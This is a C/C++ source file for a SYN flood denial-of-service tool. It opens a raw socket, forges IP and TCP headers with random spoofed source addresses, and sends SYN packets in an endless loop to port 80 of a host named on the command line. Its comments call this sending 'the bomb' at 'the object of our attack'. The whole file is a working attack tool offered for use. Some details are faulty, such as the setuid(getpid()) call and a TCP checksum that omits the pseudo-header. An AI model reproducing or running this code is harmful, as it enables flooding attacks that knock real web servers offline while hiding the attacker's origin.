#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#include <netdb.h>
#include <cstring>
#include <arpa/inet.h>
#include <iostream>

using namespace std;

#define DESTPORT 80 /* Port to be attacked (WEB) */
#define LOCALPORT 8888

/* The following is the algorithm of the first checksum */
unsigned short check_sum(unsigned short *addr, int len)
{
	register int nleft = len;
	register int sum = 0;
	register short *w = (short *)addr;
	short answer = 0;
	while (nleft > 1)
	{
		sum += *w++;
		nleft -= 2;
	}
	if (nleft == 1)
	{
		*(unsigned char *)(&answer) = *(unsigned char *)w;
		sum += answer;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}

/******* The realization of sending the bomb *********/
void send_tcp(int sockfd, struct sockaddr_in *addr)
{
	char buffer[100]; // Used to place our data packets
	struct ip *ip;
	struct tcphdr *tcp;
	int head_len;

	// Our data packet actually has no content,
	// So the length is the length of the two structures
	head_len = sizeof(struct ip) + sizeof(struct tcphdr);
	bzero(buffer, 100);
	// Fill the header of the IP packet
	ip = (struct ip *)buffer;
	ip->ip_v = IPVERSION;				// The version is generally 4
	ip->ip_hl = sizeof(struct ip) >> 2; //IP packet header length
	ip->ip_tos = 0;						// Service type
	ip->ip_len = htons(head_len);		// IP packet length
	ip->ip_id = 0;						// Let the system fill it in
	ip->ip_off = 0;						// Same as above, save some time
	ip->ip_ttl = MAXTTL;				// The longest time 255
	ip->ip_p = IPPROTO_TCP;				// What we want to send is a TCP packet
	ip->ip_sum = 0;						// Checksum and let the system do it
	ip->ip_dst = addr->sin_addr;		// The object of our attac

	// Start filling in TCP packets
	tcp = (struct tcphdr *)(buffer + sizeof(struct ip));
	tcp->source = htons(LOCALPORT);
	tcp->dest = addr->sin_port; // Destination port
	tcp->seq = random();
	tcp->ack_seq = 0;
	tcp->doff = 5;
	tcp->syn = 1; // I want to establish a connection
	tcp->check = 0;
	while (1)
	{
		// You don't know where I came from, wait slowly!
		ip->ip_src.s_addr = random();
		//ip->ip_src.s_addr=0;

		//Check header
		tcp->check = check_sum((unsigned short *)tcp, sizeof(struct tcphdr));
		sendto(sockfd, buffer, head_len, 0, (struct sockaddr *)addr, sizeof(struct sockaddr_in));
	}
}

int main(int argc, char **argv)
{
	int sockfd;
	struct sockaddr_in addr;
	struct hostent *host;
	int on = 1;
	if (argc != 2)
	{
		cout << "Command Error: Tool usage command- <" << argv[0] << " hostname>" << endl;
		//fprintf(stderr,"Usage:%s hostname\n\a",argv[0]);
		exit(1);
	}

	memset(&addr, 0, sizeof(struct sockaddr_in));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(DESTPORT);
	if (inet_aton(argv[1], &addr.sin_addr) == 0)
	{
		host = gethostbyname(argv[1]);
		if (host == NULL)
		{
			cout<<"Hostname Error: "<<hstrerror(h_errno)<<endl;
			//fprintf(stderr, "HostName Error:%s\n\a", hstrerror(h_errno));
			exit(1);
		}
		addr.sin_addr = *(struct in_addr *)(host->h_addr_list[0]);
	}

	/**** Use IPPROTO_TCP to create a TCP raw socket ****/
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sockfd < 0)
	{
		cout<<"Socket Error: Try to run in previledged mode";
		//fprintf(stderr, "Socket Error");
		exit(1);
	}
	// Set the IP data packet format and tell the system kernel module the IP data packet
	// Let us fill in
	setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
	// There is no way, only super protect users can use raw sockets
	setuid(getpid());
	/********* Sent a bomb !!!! ****/
	send_tcp(sockfd, &addr);
}